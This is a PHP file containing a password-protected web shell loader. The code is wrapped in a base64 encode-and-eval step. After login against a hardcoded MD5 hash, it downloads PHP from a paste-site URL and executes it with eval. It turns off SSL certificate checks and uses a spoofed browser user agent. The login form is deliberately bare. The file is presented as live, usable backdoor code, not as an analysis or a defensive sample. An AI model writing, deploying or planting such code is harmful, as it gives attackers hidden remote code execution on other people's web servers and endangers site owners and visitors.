<?php
// Original PHP code
$code = '<?php
session_start();

// Function to get content from a URL
function geturlsinfo($url) {
    if (function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION["coki"])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["coki"]);
        }
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists("file_get_contents")) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in() {
    return isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;
}

// Check if the password is submitted and correct
if (isset($_POST["password"])) {
    $entered_password = $_POST["password"];
    $hashed_password = "7e1ec2c11162bdc7d881c006da47cea1";
    if (md5($entered_password) === $hashed_password) {
        $_SESSION["logged_in"] = true;
        $_SESSION["coki"] = "asu";
    } else {
        echo "Incorrect password. Please try again.";
    }
}

if (is_logged_in()) {
    $a = geturlsinfo("https://pastee.dev/r/bqph0nm5/0");
    eval("?>" . $a);
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>L</title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="password">P:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="L">
        </form>
    </body>
    </html>
    <?php
}
?>';
$encoded_code = base64_encode($code);
eval('?>' . base64_decode($encoded_code));
?>
